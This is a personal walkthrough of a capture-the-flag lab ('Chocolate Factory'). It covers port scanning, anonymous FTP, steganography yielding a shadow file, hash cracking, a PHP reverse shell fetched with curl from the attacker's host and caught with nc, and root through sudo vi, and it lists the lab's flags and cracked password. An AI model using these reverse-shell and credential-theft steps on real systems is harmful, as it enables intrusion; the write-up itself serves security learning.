### Nmap

```
PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 3.0.3
22/tcp  open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 b44502b6248ea9065f6c79448a06555e (ED25519)
80/tcp  open  http       Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
100/tcp open  newacct?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
106/tcp open  pop3pw?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
109/tcp open  pop2?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
110/tcp open  pop3?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
111/tcp open  rpcbind?
| fingerprint-strings: 
|   NULL, RPCCheck: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
113/tcp open  ident?
| fingerprint-strings: 
|   GenericLines, GetRequest, NULL, RTSPRequest, SMBProgNeg: 
|_    http://localhost/key_rev_key <- You will find the key here!!!
119/tcp open  nntp?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
125/tcp open  locus-map?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"

```

### FTP

1. Anonymous login allowed
2. One image file in ftp

```
-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
```

3. Hidden data inside
```
┌─[glack@parrot]─[~/Desktop/THM/chocolate]
└──╼ $steghide extract -sf gum_room.jpg 
Enter passphrase: 
wrote extracted data to "b64.txt".
```

3. It contained the contents of /etc/shadow
```
daemon:*:18380:0:99999:7:::
bin:*:18380:0:99999:7:::
sys:*:18380:0:99999:7:::
...
...
statd:*:18451:0:99999:7:::
_gvm:*:18496:0:99999:7:::
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
```


### HTTP

1. Website is running on php
2. Ferox gives this
```
200       32l       48w      569c http://10.10.215.165/home.php
200       69l      131w     1466c http://10.10.215.165/index.html
200        1l        2w       93c http://10.10.215.165/validate.php

```


3. Another hint was given in the nmap result
```
RTSPRequest, SMBProgNeg: 
|_    http://localhost/key_rev_key <- You 
```

4. Downloaded file was given executable permissions using chmod. 
Key inside can be found using
`strings key_rev_key`


```
─[glack@parrot]─[~/Desktop/THM/chocolate]
└──╼ $./key_rev_key
Enter your name: laksdhfas

 congratulations you have found the key:   b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
```


5. used this siite to get the format of hashes in `/etc/shadow`
https://www.cyberciti.biz/faq/understanding-etcshadow-file/

6. Used this site to to crack the hash
https://hashes.com/en/decrypt/hash
`$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:cn7824`

7. I am not able to ssh into machine using `charlie:cn7824`. But we can login using the creds in web portal `http://10.10.155.21/home.php`

8. We are able to run RCE which essentially means we can get a reverse shell but how, i used this below method that i found in other machine writeup

```
curl http://10.17.24.189:8000/php-reverse-shell.php -o revshell.php

php7.2 /dev/shm/revshell.php


nc -lnvp 9999

```

9. We get a shell with `www`

### Priv Esc

1. Found a file name `teleport` in /home/charlie
2. It contains private RSA key of charlie, copied it into my systems
3. Used it to login as `charlie` onto the machine

```
─[✗]─[glack@parrot]─[~/Desktop/THM/chocolate]
└──╼ $ssh -i id_rsa charlie@10.10.155.21

```

Machine is very laggy and testing my patience

4. Found the user flag
```
charlie@chocolate-factory:/home/charlie$ cat user.txt
flag{cd5509042371b34e4826e4838b522d2e}
```

5. checked the `sudo -l` command, turns out we can run vi as sudo

6. Used [[Sudo - NOPASSWD vi filename]] this method to escalate privileges and got root

7. They made the root flag interesting
```
print(mess)root@chocolate-factory:/root# python root.py 
Enter the key:  b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='


flag{cec59161d338fef787fcb4e296b42124}

```